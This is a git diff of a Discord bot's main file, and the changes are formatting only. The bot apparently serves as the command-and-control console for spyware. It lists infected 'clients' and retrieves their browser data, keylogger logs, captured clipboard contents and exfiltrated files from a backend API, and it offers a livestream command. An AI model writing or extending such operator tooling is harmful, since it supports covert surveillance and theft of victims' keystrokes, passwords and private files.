@@ -1,24 +1,21 @@
-import {
-    Client,
-    GatewayIntentBits
-} from 'discord.js';
+import {Client, GatewayIntentBits} from 'discord.js';
 
 import config from './static/config.json' assert {type: 'json'};
 
-import { fetchDataAndUpdateInteraction, handleFileResponse } from "./utils/data.js";
-import { refreshTokenIfNeeded } from "./utils/token.js";
+import {fetchDataAndUpdateInteraction, handleFileResponse} from "./utils/data.js";
+import {refreshTokenIfNeeded} from "./utils/token.js";
 import {
     handleClientsCommand,
     handleHelpCommand,
     handleListDataCommand,
-    handleSendCommand,
+    handleListDirectoriesClientCommand,
     handleLivestreamCommand,
-    handleListDirectoriesClientCommand
+    handleSendCommand
 } from "./utils/handleCommands.js";
 
-const { TOKEN, API_BASE_URL } = config;
+const {TOKEN, API_BASE_URL} = config;
 
-const client = new Client({ intents: [GatewayIntentBits.Guilds] });
+const client = new Client({intents: [GatewayIntentBits.Guilds]});
 
 client.on('ready', async () => {
     console.log(`Connecté en tant que ${client.user.tag}!`);
@@ -50,7 +47,7 @@ client.on('interactionCreate', async interaction => {
         }
     } else if (interaction.isButton()) {
         const [type, clientId, browser] = interaction.customId.split('_');
-        if(type !== 'next' && type !== 'previous'){
+        if (type !== 'next' && type !== 'previous') {
             await fetchDataAndUpdateInteraction(type, interaction, clientId, browser);
         }
 
@@ -74,17 +71,17 @@ client.on('interactionCreate', async interaction => {
     } else if (interaction.customId === "select_keylogger") {
         const [keyloggerDataId, filename] = interaction.values[0].split('_');
         const endpoint = `${API_BASE_URL}/keylogger/log/${keyloggerDataId}`;
-        await handleFileResponse(interaction, endpoint,filename, "Voici le contenu du fichier :", 'text');
+        await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');
 
     } else if (interaction.customId === "select_clipboard") {
         const [clipboardDataId, filename] = interaction.values[0].split('_');
         const endpoint = `${API_BASE_URL}/clipboard/content/${clipboardDataId}`;
         await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');
 
-    }else if (interaction.customId === "select_downloadfile") {
+    } else if (interaction.customId === "select_downloadfile") {
         const [downloadFileId, filename] = interaction.values[0].split('_');
         const endpoint = `${API_BASE_URL}/download/file/${downloadFileId}`;
-        await handleFileResponse(interaction, endpoint, filename,"Voici le contenu du fichier :", 'text');
+        await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');
     }
 
 });
